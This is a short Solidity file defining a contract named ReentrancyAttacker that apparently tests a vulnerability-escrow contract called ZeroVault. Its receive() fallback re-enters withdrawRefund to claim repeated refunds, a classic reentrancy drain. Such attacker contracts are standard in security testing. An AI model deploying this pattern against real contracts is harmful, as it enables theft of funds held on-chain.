// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IZeroVault {
    function revealAndClaim(
        bytes32 merkleRoot,
        bytes calldata decryptionKey,
        bytes calldata encryptedKeyForBuyer
    ) external;
    function commitVulnerability(
        bytes32 merkleRoot,
        bytes32 keyHash,
        address vendor,
        uint256 askingPrice,
        bytes32 ipfsHash
    ) external;
    function withdrawRefund() external;
}

contract ReentrancyAttacker {
    IZeroVault public vault;
    bytes32 public targetMerkleRoot;
    bytes public targetDecryptionKey;
    bytes public targetEncryptedKey;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = IZeroVault(_vault);
    }

    function setTarget(
        bytes32 _merkleRoot,
        bytes calldata _decryptionKey,
        bytes calldata _encryptedKey
    ) external {
        targetMerkleRoot = _merkleRoot;
        targetDecryptionKey = _decryptionKey;
        targetEncryptedKey = _encryptedKey;
    }

    function commitAndAttack(
        bytes32 _merkleRoot,
        bytes32 _keyHash,
        address _vendor,
        uint256 _askingPrice,
        bytes32 _ipfsHash
    ) external {
        vault.commitVulnerability(_merkleRoot, _keyHash, _vendor, _askingPrice, _ipfsHash);
    }

    function attack() external {
        vault.revealAndClaim(targetMerkleRoot, targetDecryptionKey, targetEncryptedKey);
        vault.withdrawRefund();
    }

    receive() external payable {
        if (attackCount < 2) {
            attackCount++;
            vault.withdrawRefund();
        }
    }
}
